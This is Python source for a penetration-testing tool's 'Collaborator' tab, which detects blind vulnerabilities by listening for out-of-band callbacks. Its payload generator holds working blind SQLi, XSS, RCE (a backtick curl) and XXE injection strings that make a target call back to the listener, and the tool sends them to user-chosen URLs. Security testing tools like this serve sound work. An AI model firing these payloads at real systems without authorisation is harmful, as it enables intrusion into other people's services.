# ============================================================================
# Sentinel Pro v3.0 — Professional OSINT & Bug Bounty Platform
# Copyright (c) 2026 @who_is_the_black_hat. All rights reserved.
#
# Unauthorized copying, distribution, or modification of this software,
# via any medium, is strictly prohibited without written permission.
#
# Licensed users may use this software under the terms of their license.
# For licensing: https://github.com/Mrsultan7890/osints
# ============================================================================

"""
Collaborator Tab — Out-of-band (OOB) blind vulnerability detection
===================================================================
Burp Collaborator alternative — self-hosted DNS/HTTP listener.
Detects blind SQLi, blind XSS, blind SSRF, blind RCE, blind XXE.

Architecture:
  - Local HTTP server on random port (Python http.server)
  - DNS polling via nslookup/dig for OOB DNS callbacks
  - Unique token per test → maps callback to original request
  - AI analysis of each hit via Groq
"""

import tkinter as tk
from tkinter import ttk, messagebox
import threading
import json
import time
import uuid
import socket
import http.server
import urllib.parse
import subprocess
import logging
from datetime import datetime
from pathlib import Path

logger = logging.getLogger(__name__)


class CollaboratorTab:
    """
    Tab: Collaborator — OOB blind detection.
    Starts a local HTTP listener, generates unique payload URLs,
    injects them into requests, monitors for callbacks.
    """

    def __init__(self, notebook, app):
        self.app        = app
        self.db         = app.db
        self._server    = None
        self._running   = False
        self._hits      = []          # list of hit dicts
        self._payloads  = {}          # token -> {type, url, param, ts}
        self._port      = 0
        self._local_ip  = self._get_local_ip()

        self.frame = ttk.Frame(notebook)
        notebook.add(self.frame, text='◎ Collaborator')
        self._build()

    # ── UI ────────────────────────────────────────────────────────────────────

    def _build(self):
        from sentinel_proxy.ui.app import (
            BG, BG2, BG3, BG4, BORDER2, ACCENT, ACCENT3,
            TEXT, TEXT2, TEXT3, GREEN, RED, ORANGE, YELLOW, CYAN, PURPLE,
            FONT_MONO, FONT_MONO_SM, FONT_MONO_XS, FONT_BOLD, SEV_COLOR
        )
        C = self._C = dict(
            BG=BG, BG2=BG2, BG3=BG3, BG4=BG4, BORDER2=BORDER2,
            ACCENT=ACCENT, ACCENT3=ACCENT3, TEXT=TEXT, TEXT2=TEXT2,
            TEXT3=TEXT3, GREEN=GREEN, RED=RED, ORANGE=ORANGE,
            YELLOW=YELLOW, CYAN=CYAN, PURPLE=PURPLE,
        )

        # ── Toolbar ───────────────────────────────────────────────────────────
        tb = tk.Frame(self.frame, bg=C['BG3'])
        tb.pack(fill='x')

        self._start_btn = ttk.Button(tb, text='▶  START LISTENER',
            style='Green.TButton', command=self._toggle_server)
        self._start_btn.pack(side='left', padx=8, pady=6)

        tk.Frame(tb, bg=C['BORDER2'], width=1).pack(side='left', fill='y', padx=8, pady=6)

        tk.Label(tb, text='PORT', bg=C['BG3'], fg=C['TEXT2'],
            font=FONT_MONO_XS).pack(side='left', padx=(0, 4))
        self._port_var = tk.StringVar(value='0')
        ttk.Entry(tb, textvariable=self._port_var, width=6).pack(side='left', padx=(0, 8))

        tk.Label(tb, text='(0 = auto)', bg=C['BG3'], fg=C['TEXT3'],
            font=FONT_MONO_XS).pack(side='left', padx=(0, 12))

        ttk.Button(tb, text='COPY URL', style='Cyan.TButton',
            command=self._copy_collab_url).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='GENERATE PAYLOAD', style='Ghost.TButton',
            command=self._generate_payload).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='CLEAR HITS', style='Ghost.TButton',
            command=self._clear_hits).pack(side='left', padx=4, pady=6)
        ttk.Button(tb, text='EXPORT', style='Ghost.TButton',
            command=self._export).pack(side='left', padx=4, pady=6)

        self._status_lbl = tk.Label(tb, text='● OFFLINE',
            bg=C['BG3'], fg=C['RED'], font=('Fira Code', 9, 'bold'))
        self._status_lbl.pack(side='right', padx=12)

        self._hit_count_lbl = tk.Label(tb, text='0 hits',
            bg=C['BG3'], fg=C['TEXT2'], font=FONT_MONO_XS)
        self._hit_count_lbl.pack(side='right', padx=8)

        # ── Info bar ──────────────────────────────────────────────────────────
        info = tk.Frame(self.frame, bg=C['BG4'])
        info.pack(fill='x')
        self._url_lbl = tk.Label(info,
            text='  Start listener to get your Collaborator URL',
            bg=C['BG4'], fg=C['TEXT3'], font=FONT_MONO_XS, anchor='w')
        self._url_lbl.pack(side='left', padx=8, pady=4)

        # ── Inject panel ──────────────────────────────────────────────────────
        inj = tk.Frame(self.frame, bg=C['BG3'])
        inj.pack(fill='x')

        tk.Label(inj, text='  AUTO-INJECT INTO REQUEST:',
            bg=C['BG3'], fg=C['TEXT2'], font=('Fira Code', 8, 'bold')).pack(
            side='left', padx=8, pady=6)

        self._inject_type = ttk.Combobox(inj, width=16, state='readonly',
            values=['Blind SQLi', 'Blind XSS', 'Blind SSRF',
                    'Blind RCE', 'Blind XXE', 'All Types'])
        self._inject_type.set('Blind SSRF')
        self._inject_type.pack(side='left', padx=4, pady=6)

        tk.Label(inj, text='PARAM', bg=C['BG3'], fg=C['TEXT2'],
            font=FONT_MONO_XS).pack(side='left', padx=(8, 4))
        self._inject_param = ttk.Entry(inj, width=14)
        self._inject_param.pack(side='left', padx=(0, 8), pady=6)

        ttk.Button(inj, text='▶ INJECT & SEND', style='Red.TButton',
            command=self._inject_and_send).pack(side='left', padx=4, pady=6)
        ttk.Button(inj, text='FROM PROXY SELECTION', style='Ghost.TButton',
            command=self._inject_from_proxy).pack(side='left', padx=4, pady=6)

        # ── Main split ────────────────────────────────────────────────────────
        pw = ttk.PanedWindow(self.frame, orient='horizontal')
        pw.pack(fill='both', expand=True)

        # Left: active payloads
        lf = tk.Frame(pw, bg=C['BG'])
        pw.add(lf, weight=1)

        lh = tk.Frame(lf, bg=C['BG3'])
        lh.pack(fill='x')
        tk.Frame(lh, bg=C['ACCENT'], width=3).pack(side='left', fill='y')
        tk.Label(lh, text='  ACTIVE PAYLOADS', bg=C['BG3'], fg=C['TEXT2'],
            font=('Fira Code', 8, 'bold')).pack(side='left', padx=4, pady=5)

        cols = ('token', 'type', 'param', 'url', 'ts')
        self._payload_tree = ttk.Treeview(lf, columns=cols, show='headings', height=8)
        for col, w, h in [
            ('token', 90, 'Token'), ('type', 90, 'Vuln Type'),
            ('param', 80, 'Param'), ('url', 200, 'Target URL'), ('ts', 70, 'Sent'),
        ]:
            self._payload_tree.heading(col, text=h)
            self._payload_tree.column(col, width=w,
                anchor='w' if col in ('url', 'param') else 'center')
        vsb1 = ttk.Scrollbar(lf, orient='vertical', command=self._payload_tree.yview)
        self._payload_tree.configure(yscrollcommand=vsb1.set)
        vsb1.pack(side='right', fill='y')
        self._payload_tree.pack(fill='both', expand=True)

        # Right: hits
        rf = tk.Frame(pw, bg=C['BG'])
        pw.add(rf, weight=2)

        rh = tk.Frame(rf, bg=C['BG3'])
        rh.pack(fill='x')
        tk.Frame(rh, bg=C['RED'], width=3).pack(side='left', fill='y')
        tk.Label(rh, text='  CALLBACKS RECEIVED', bg=C['BG3'], fg=C['RED'],
            font=('Fira Code', 8, 'bold')).pack(side='left', padx=4, pady=5)

        cols2 = ('ts', 'type', 'token', 'src_ip', 'path', 'vuln')
        self._hits_tree = ttk.Treeview(rf, columns=cols2, show='headings')
        for col, w, h in [
            ('ts', 75, 'Time'), ('type', 80, 'Proto'),
            ('token', 90, 'Token'), ('src_ip', 110, 'Source IP'),
            ('path', 200, 'Path/Query'), ('vuln', 100, 'Vuln Type'),
        ]:
            self._hits_tree.heading(col, text=h)
            self._hits_tree.column(col, width=w,
                anchor='w' if col in ('path',) else 'center')
        self._hits_tree.tag_configure('hit', foreground=C['RED'], background='#1a0000')
        vsb2 = ttk.Scrollbar(rf, orient='vertical', command=self._hits_tree.yview)
        self._hits_tree.configure(yscrollcommand=vsb2.set)
        vsb2.pack(side='right', fill='y')
        self._hits_tree.pack(fill='both', expand=True)
        self._hits_tree.bind('<<TreeviewSelect>>', self._on_hit_select)

        # Detail
        dh = tk.Frame(rf, bg=C['BG3'])
        dh.pack(fill='x')
        tk.Frame(dh, bg=C['ACCENT'], width=3).pack(side='left', fill='y')
        tk.Label(dh, text='  HIT DETAIL + AI ANALYSIS', bg=C['BG3'], fg=C['TEXT2'],
            font=('Fira Code', 8, 'bold')).pack(side='left', padx=4, pady=5)

        detail_f = tk.Frame(rf, bg=C['BG'])
        detail_f.pack(fill='both', expand=True)
        self._txt_detail = tk.Text(detail_f, bg=C['BG2'], fg=C['GREEN'],
            font=('Fira Code', 9), relief='flat', borderwidth=0,
            wrap='word', padx=10, pady=8, height=8)
        vs = ttk.Scrollbar(detail_f, orient='vertical', command=self._txt_detail.yview)
        self._txt_detail.configure(yscrollcommand=vs.set)
        vs.pack(side='right', fill='y')
        self._txt_detail.pack(fill='both', expand=True)

    # ── Server ────────────────────────────────────────────────────────────────

    def _toggle_server(self):
        if self._running:
            self._stop_server()
        else:
            self._start_server()

    def _start_server(self):
        try:
            port = int(self._port_var.get() or 0)
        except ValueError:
            port = 0

        tab = self

        class _Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                tab._on_http_hit(self)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')

            def do_POST(self):
                tab._on_http_hit(self)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'ok')

            def log_message(self, fmt, *args):
                pass  # suppress default logging

        try:
            self._server = http.server.HTTPServer(('0.0.0.0', port), _Handler)
            self._port   = self._server.server_address[1]
            self._running = True
            threading.Thread(target=self._server.serve_forever,
                             daemon=True, name='collab-server').start()
            collab_url = f'http://{self._local_ip}:{self._port}'
            self._url_lbl.config(
                text=f'  Collaborator URL: {collab_url}  ·  Token format: {collab_url}/TOKEN',
                fg=self._C['ACCENT'])
            self._status_lbl.config(text=f'● ONLINE :{self._port}', fg=self._C['GREEN'])
            self._start_btn.config(text='■  STOP LISTENER')
            self.app._set_status(f'Collaborator listening on {collab_url}')
        except Exception as e:
            messagebox.showerror('Collaborator', f'Failed to start: {e}')

    def _stop_server(self):
        if self._server:
            threading.Thread(target=self._server.shutdown, daemon=True).start()
            self._server  = None
        self._running = False
        self._start_btn.config(text='▶  START LISTENER')
        self._status_lbl.config(text='● OFFLINE', fg=self._C['RED'])
        self._url_lbl.config(
            text='  Start listener to get your Collaborator URL',
            fg=self._C['TEXT3'])

    def _on_http_hit(self, handler):
        src_ip  = handler.client_address[0]
        path    = handler.path
        ts      = datetime.now().strftime('%H:%M:%S')
        # Extract token from path: /TOKEN or /TOKEN?...
        token   = path.lstrip('/').split('?')[0].split('/')[0]
        payload = self._payloads.get(token, {})
        vuln    = payload.get('type', 'Unknown')

        hit = {
            'ts': ts, 'proto': 'HTTP', 'token': token,
            'src_ip': src_ip, 'path': path, 'vuln': vuln,
            'payload': payload, 'headers': dict(handler.headers),
        }
        self._hits.append(hit)
        self.db.save_collaborator_hit(hit)
        self.app.root.after(0, lambda h=hit: self._add_hit_row(h))

    def _add_hit_row(self, hit: dict):
        self._hits_tree.insert('', 0,
            values=(hit['ts'], hit['proto'], hit['token'][:12],
                    hit['src_ip'], hit['path'][:60], hit['vuln']),
            tags=('hit',))
        count = len(self._hits)
        self._hit_count_lbl.config(text=f'{count} hit{"s" if count != 1 else ""}')
        self.app._set_status(
            f'🔴 COLLABORATOR HIT: {hit["vuln"]} from {hit["src_ip"]}')
        # AI analysis in background
        threading.Thread(target=self._ai_analyze_hit,
                         args=(hit,), daemon=True).start()

    def _ai_analyze_hit(self, hit: dict):
        try:
            analyzer = self.app.analyzer
            if not hasattr(analyzer, '_groq') or not analyzer._groq:
                return
            payload_info = hit.get('payload', {})
            prompt = (
                f"Out-of-band callback received by security proxy Collaborator:\n"
                f"  Source IP  : {hit['src_ip']}\n"
                f"  Path       : {hit['path']}\n"
                f"  Vuln Type  : {hit['vuln']}\n"
                f"  Target URL : {payload_info.get('url', 'unknown')}\n"
                f"  Parameter  : {payload_info.get('param', 'unknown')}\n\n"
                f"Confirm if this is a real vulnerability, explain the impact, "
                f"and give a one-paragraph remediation. Be concise."
            )
            result = analyzer._groq.ask(prompt, max_tokens=300)
            self.app.root.after(0, lambda r=result, h=hit:
                self._txt_detail.insert('end',
                    f"\n── AI Analysis ──\n{r}\n{'─'*50}\n"))
        except Exception:
            pass

    # ── Payload generation ────────────────────────────────────────────────────

    def _make_token(self) -> str:
        return uuid.uuid4().hex[:12]

    def _collab_url(self, token: str) -> str:
        return f'http://{self._local_ip}:{self._port}/{token}'

    def _get_payload(self, vuln_type: str, token: str) -> str:
        url = self._collab_url(token)
        payloads = {
            'Blind SQLi':  f"'; SELECT LOAD_FILE('{url}'); -- ",
            'Blind XSS':   f'"><script src="{url}"></script>',
            'Blind SSRF':  url,
            'Blind RCE':   f'`curl {url}`',
            'Blind XXE':   (f'<?xml version="1.0"?><!DOCTYPE foo '
                            f'[<!ENTITY xxe SYSTEM "{url}">]><foo>&xxe;</foo>'),
        }
        return payloads.get(vuln_type, url)

    def _generate_payload(self):
        if not self._running:
            messagebox.showwarning('Collaborator', 'Start listener first')
            return
        token    = self._make_token()
        vtype    = self._inject_type.get()
        payload  = self._get_payload(vtype, token)
        self._payloads[token] = {
            'type': vtype, 'url': '', 'param': '', 'ts': datetime.now().strftime('%H:%M:%S')
        }
        self._payload_tree.insert('', 0,
            values=(token, vtype, '', '', datetime.now().strftime('%H:%M:%S')))
        self.app.root.clipboard_clear()
        self.app.root.clipboard_append(payload)
        self.app._set_status(f'Payload copied: {payload[:60]}')
        self._txt_detail.delete('1.0', 'end')
        self._txt_detail.insert('1.0',
            f'Generated {vtype} payload:\n\n{payload}\n\n'
            f'Token: {token}\nCallback URL: {self._collab_url(token)}\n\n'
            f'Payload copied to clipboard. Inject it manually or use AUTO-INJECT.\n')

    def _copy_collab_url(self):
        if not self._running:
            messagebox.showwarning('Collaborator', 'Start listener first')
            return
        url = f'http://{self._local_ip}:{self._port}'
        self.app.root.clipboard_clear()
        self.app.root.clipboard_append(url)
        self.app._set_status(f'Collaborator URL copied: {url}')

    # ── Inject ────────────────────────────────────────────────────────────────

    def _inject_and_send(self):
        if not self._running:
            messagebox.showwarning('Collaborator', 'Start listener first')
            return
        url   = self.app.rep_url.get().strip() if hasattr(self.app, 'rep_url') else ''
        param = self._inject_param.get().strip()
        vtype = self._inject_type.get()
        if not url:
            messagebox.showwarning('Collaborator',
                'Load a request in Repeater first, then click INJECT & SEND')
            return
        if not param:
            messagebox.showwarning('Collaborator', 'Enter a parameter name to inject')
            return

        token   = self._make_token()
        payload = self._get_payload(vtype, token)
        self._payloads[token] = {
            'type': vtype, 'url': url, 'param': param,
            'ts': datetime.now().strftime('%H:%M:%S')
        }
        self._payload_tree.insert('', 0,
            values=(token, vtype, param, url[:40], datetime.now().strftime('%H:%M:%S')))

        # Build injected URL
        sep      = '&' if '?' in url else '?'
        test_url = f'{url}{sep}{param}={urllib.parse.quote(payload)}'

        def _send():
            try:
                import requests as _req
                is_json = payload.strip().startswith('{')
                if '?' in url or vtype not in ('Blind SSRF', 'Blind SQLi'):
                    r = _req.get(test_url, verify=False, timeout=10, allow_redirects=False)
                else:
                    body_data = json.dumps({param: payload})
                    r = _req.post(url, data=body_data,
                        headers={'Content-Type': 'application/json'},
                        verify=False, timeout=10, allow_redirects=False)
                self.app.root.after(0, lambda: self.app._set_status(
                    f'Injected {vtype} → {r.status_code}  ·  Waiting for callback...'))
            except Exception as e:
                self.app.root.after(0, lambda: self.app._set_status(
                    f'Inject error: {str(e)[:50]}'))

        threading.Thread(target=_send, daemon=True).start()
        self._txt_detail.delete('1.0', 'end')
        self._txt_detail.insert('1.0',
            f'Injected {vtype} payload:\n\n'
            f'  URL   : {test_url[:100]}\n'
            f'  Token : {token}\n'
            f'  Param : {param}\n\n'
            f'Waiting for out-of-band callback...\n')

    def _inject_from_proxy(self):
        """Inject into currently selected proxy request."""
        if not self._running:
            messagebox.showwarning('Collaborator', 'Start listener first')
            return
        req_id = getattr(self.app, 'selected_req', None)
        if not req_id:
            messagebox.showwarning('Collaborator',
                'Select a request in Proxy tab first')
            return
        req = self.db.get_request(req_id)
        if not req:
            return
        url   = req.get('url', '')
        vtype = self._inject_type.get()
        param = self._inject_param.get().strip()

        # Auto-detect first param if not specified
        if not param:
            try:
                import json as _j
                params = _j.loads(req.get('params', '{}'))
                param  = next(iter(params), 'q')
            except Exception:
                param = 'q'
            self._inject_param.delete(0, 'end')
            self._inject_param.insert(0, param)

        token   = self._make_token()
        payload = self._get_payload(vtype, token)
        self._payloads[token] = {
            'type': vtype, 'url': url, 'param': param,
            'ts': datetime.now().strftime('%H:%M:%S')
        }
        self._payload_tree.insert('', 0,
            values=(token, vtype, param, url[:40], datetime.now().strftime('%H:%M:%S')))

        sep      = '&' if '?' in url else '?'
        test_url = f'{url}{sep}{param}={urllib.parse.quote(payload)}'

        def _send():
            try:
                import requests as _req
                is_json_endpoint = not ('?' in url)
                if is_json_endpoint:
                    body_data = json.dumps({param: payload})
                    r = _req.post(url, data=body_data,
                        headers={'Content-Type': 'application/json'},
                        verify=False, timeout=10, allow_redirects=False)
                else:
                    r = _req.get(test_url, verify=False, timeout=10, allow_redirects=False)
                self.app.root.after(0, lambda: self.app._set_status(
                    f'OOB {vtype} injected → HTTP {r.status_code}  ·  Waiting for callback...'))
            except Exception as e:
                self.app.root.after(0, lambda: self.app._set_status(
                    f'Inject error: {str(e)[:50]}'))

        threading.Thread(target=_send, daemon=True).start()

    # ── Hits ──────────────────────────────────────────────────────────────────

    def _on_hit_select(self, event=None):
        sel = self._hits_tree.selection()
        if not sel:
            return
        idx = self._hits_tree.index(sel[0])
        # hits are inserted at 0 so reverse index
        rev_idx = len(self._hits) - 1 - idx
        if rev_idx < 0 or rev_idx >= len(self._hits):
            return
        hit = self._hits[rev_idx]
        out = (f"{'='*55}\n"
               f"  OUT-OF-BAND CALLBACK CONFIRMED\n"
               f"{'='*55}\n\n"
               f"Time       : {hit['ts']}\n"
               f"Protocol   : {hit['proto']}\n"
               f"Source IP  : {hit['src_ip']}\n"
               f"Token      : {hit['token']}\n"
               f"Path       : {hit['path']}\n"
               f"Vuln Type  : {hit['vuln']}\n\n")
        payload_info = hit.get('payload', {})
        if payload_info:
            out += (f"Original Target : {payload_info.get('url', '')}\n"
                    f"Parameter       : {payload_info.get('param', '')}\n\n")
        hdrs = hit.get('headers', {})
        if hdrs:
            out += "Request Headers:\n"
            for k, v in list(hdrs.items())[:10]:
                out += f"  {k}: {v}\n"
        self._txt_detail.delete('1.0', 'end')
        self._txt_detail.insert('1.0', out)

    def _clear_hits(self):
        self._hits.clear()
        for i in self._hits_tree.get_children():
            self._hits_tree.delete(i)
        self._txt_detail.delete('1.0', 'end')
        self._hit_count_lbl.config(text='0 hits')

    def _export(self):
        from tkinter import filedialog
        if not self._hits:
            messagebox.showwarning('Collaborator', 'No hits to export')
            return
        path = filedialog.asksaveasfilename(
            defaultextension='.json',
            filetypes=[('JSON', '*.json')],
            initialfile=f'collaborator_{int(time.time())}.json')
        if not path:
            return
        with open(path, 'w') as f:
            json.dump(self._hits, f, indent=2, default=str)
        self.app._set_status(f'Exported {len(self._hits)} hits → {path}')

    # ── Helpers ───────────────────────────────────────────────────────────────

    @staticmethod
    def _get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return '127.0.0.1'
